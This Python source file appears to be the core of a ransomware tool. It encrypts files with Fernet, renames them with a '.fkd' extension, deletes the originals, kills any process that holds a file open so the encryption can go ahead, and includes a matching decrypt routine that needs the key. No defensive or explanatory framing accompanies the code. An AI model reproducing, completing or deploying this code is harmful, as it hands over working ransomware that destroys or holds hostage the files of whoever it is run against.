import os

import psutil
from cryptography.fernet import Fernet


def decrypt_file(path, password):

    if not path.endswith('.fkd'):
        return

    try:
        # Load the file's content into memory
        with open(path, 'rb') as file:
            file_content = file.read()

        # Generate a key from the password
        key = password
        f = Fernet(key)

        # Decrypt the file's content
        decrypted_content = f.decrypt(file_content)

        # Get the original file name (without the .fkd extension)
        original_path = os.path.splitext(path)[0]

        # Write the decrypted content back to the original file
        with open(original_path, 'wb') as file:
            file.write(decrypted_content)

        # Remove the encrypted file
        os.remove(path)

        print(f'File "{path}" decrypted successfully.')

    except Exception as e:
        print(f"Couldn't find a way to decrypt: {path} - Maybe we need MORE authorization. Or DECRYPTION KEY is WRONG - {e}")


def terminate_process_using_file(path):
    try:
        process_list = psutil.process_iter(['pid', 'name', 'open_files'])

        for process in process_list:
            try:
                files = process.open_files()
                for file in files:
                    if file.path == path:
                        print(f'Terminating process: {process.pid} - {process.name()}')
                        process.terminate()
                        return True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        print('No process using the file was found.')
        return False

    except psutil.Error as e:
        print(f'Error: {e}')
        return False

def try_encrypt_file(path, password):
    try:
        with open(path, 'rb') as file:
            file_content = file.read()

        key = password
        fernet = Fernet(key)
        encrypted_content = fernet.encrypt(file_content)
        print(f"File: {path} Content encrypted")

        new_path = path + '.fkd'

        if os.path.exists(new_path):
            print(f"Found existing .fkd file at: {new_path}")
            os.remove(new_path)
            print(f"Deleted .fkd file at: {new_path}")

        #os.rename(path, new_path)
        #print(f"Renamed from: {path} to {new_path} successfully")

        with open(new_path, 'wb') as file:
            file.write(encrypted_content)
        print(f"Wrote encrypted data to {new_path} successfully")

        os.remove(path)

        print(f"File {path} deleted successfully")

        print(f'File "{path}" encrypted successfully to {new_path}.')
        return True

    except Exception as e:
        return False

def encrypt_file(path, password):
    if path.endswith('.fkd'):
        print(f"Skipping file as it already is encrypted: {path}")
        return

    if try_encrypt_file(path, password):
        return
    else:
        print(f"Something went wrong.. trying other ways")

        if terminate_process_using_file(path):
            if not os.path.exists(path):
                return
            print(f"Found process. Terminated it. Encrypting...")

            if try_encrypt_file(path, password):
                return
            else:
                print(f"Sadly file: {path} could not be encrypted. Maybe we need MORE authorization.")

        else:
            if not os.path.exists(path):
                return
            print(f'Continue encrypting....')

            if try_encrypt_file(path, password):
                return
            else:
                print(f"Sadly file: {path} could not be encrypted. Maybe we need MORE authorization.")
